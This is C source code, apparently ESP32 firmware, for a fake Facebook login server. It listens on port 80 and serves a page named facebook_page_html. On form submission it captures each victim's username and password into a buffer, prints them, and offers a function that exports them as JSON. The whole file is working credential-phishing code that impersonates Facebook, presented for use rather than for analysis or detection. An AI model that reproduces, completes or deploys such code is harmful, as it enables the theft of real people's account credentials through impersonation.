#include "facebook_web_server.h"

void print_cred_buffer(cred_buffer_t* buffer){
    int i;
    printf("Avem %d linii\n", buffer->count);
    for(i = 0; i<buffer->count;i++){
        printf("username=%s  pass=%s\n", buffer->entries[i].username, buffer->entries[i].password);
    }
}

static void store_credentials(cred_buffer_t* buffer, const char* user, const char* pass) {
    strncpy(buffer->entries[buffer->count].username, user, sizeof(buffer->entries[buffer->count].username) - 1);
    strncpy(buffer->entries[buffer->count].password, pass, sizeof(buffer->entries[buffer->count].password) - 1);
    buffer->count++;
    if (buffer->count >= MAX_CRED_ENTRIES) {
        buffer->count = 0;
    }
}

int cred_buffer_to_json(cred_buffer_t* buffer, char* out, size_t out_size) {
    if (!buffer || !out || out_size == 0) return -1;

    size_t len = 0;
    int n = buffer->count < MAX_CRED_ENTRIES ? buffer->count : MAX_CRED_ENTRIES;

    int written = snprintf(out + len, out_size - len, "[");
    if (written < 0 || (size_t)written >= out_size - len) return -1;
    len += written;

    for (int i = 0; i < n; ++i) {
        const char *user = buffer->entries[i].username;
        const char *pass = buffer->entries[i].password;

        written = snprintf(out + len, out_size - len,
            "{\"username\":\"%s\",\"password\":\"%s\"}%s",
            user, pass, (i < n - 1) ? "," : "");
        if (written < 0 || (size_t)written >= out_size - len) return -1;
        len += written;
    }

    written = snprintf(out + len, out_size - len, "]");
    if (written < 0 || (size_t)written >= out_size - len) return -1;
    len += written;

    return (int)len;
}

void handle_facebook_connection(allocator_t* allocator, http_request_t* req, int client_sock) {
    if(strcmp(req->method, "GET") == 0){
        ESP_LOGI("FacebookWebServer", "Handling GET request");
        http_send_html_response(client_sock, (char*)facebook_page_html);
    }
    else if(strcmp(req->method, "POST") == 0) {
        ESP_LOGI("FacebookWebServer", "Handling POST request");
        printf("BODY: %s\n", req->body);
        char* username = extract_form_field_to_buffer(allocator, req->body, "username");
        if (!username) {
            ESP_LOGE("FacebookWebServer", "Failed to extract username");
            http_send_bad_request_response(client_sock);
            return;
        }
        char* password = extract_form_field_to_buffer(allocator, req->body, "password");
        if (!password) {
            ESP_LOGE("FacebookWebServer", "Failed to extract password");
            http_send_bad_request_response(client_sock);
            return;
        }
        store_credentials(&cred_buffer, username, password);

        http_send_ok_response(client_sock);
    } else {
        ESP_LOGI("FacebookWebServer", "Handling not found request");
        http_send_not_found_response(client_sock);
    }
}

void serve_facebook_page(){
    uint8_t mem[2048];
    allocator_t alloc = {0};
    allocator_init(&alloc, mem, 2048);

    ESP_LOGI("FacebookWebServer", "Creating socket...");
    int sock = socket_create(IPv4, Stream);
    if (sock < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to create socket");
        return;
    }

    socket_set_reuse_addr_option(sock);

    ESP_LOGI("FacebookWebServer", "Binding socket...");
    if (socket_bind(sock, IPv4, 80, INADDR_ANY) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to bind socket");
        close(sock);
        return;
    }

    if (socket_listen(sock, 5) < 0) {
        ESP_LOGE("FacebookWebServer", "Failed to listen on socket");
        close(sock);
        return;
    }
    ESP_LOGI("FacebookWebServer", "Web server started on port 80");

    while (1) {
        int client_sock = socket_accept(sock);
        if (client_sock < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to accept connection");
            continue;
        }
        ESP_LOGI("FacebookWebServer", "Connection accepted...");

        char* buffer = allocator_alloc_type(&alloc, char, 1024);
        int len = socket_receive(client_sock, buffer, 1023);
        if (len < 0) {
            ESP_LOGE("FacebookWebServer", "Failed to receive data");
            close(client_sock);
            continue;
        }
        buffer[len] = 0;
        
        http_request_t* req = http_request_parse(&alloc, buffer);
        printf("Facebook Request Method: %s\n", req->method);
        printf("Facebook Request URL: %s\n", req->url);

        handle_facebook_connection(&alloc, req, client_sock);

        allocator_reset(&alloc);
        close(client_sock);
    }
}